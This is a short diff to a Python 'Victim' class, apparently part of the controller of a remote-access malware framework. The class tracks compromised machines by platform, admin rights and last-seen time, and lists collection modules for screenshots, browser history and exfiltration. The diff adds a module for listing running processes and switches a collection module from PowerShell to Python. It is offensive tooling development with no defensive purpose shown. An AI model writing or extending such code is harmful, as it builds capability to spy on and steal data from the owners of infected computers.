@@ -13,7 +13,7 @@ class Victim:
 
 	mongoclient = None
 	victims = {}
-	module_hash = {'Windows' : ['screenshot','browser_history','exfiltration'], 'Linux': ['screenshot','exfiltration']}
+	module_hash = {'Windows' : ['screenshot','browser_history','exfiltration','running_processes'], 'Linux': ['screenshot','exfiltration','running_processes']}
 
 	def __init__(self,victim_id,platform,os_version,admin,status = 'Alive',lastseen = datetime.datetime.now(),add_db = True):
 		self.victim_id = victim_id
@@ -134,7 +134,7 @@ class Victim:
 
 				module = re.findall(r'^use (.*)$',cmd)[0]
 				if module in self.modules:
-					language = 'powershell'
+					language = 'python'
 					utility = 'collection'
 					Module.show_options(module,utility)
 
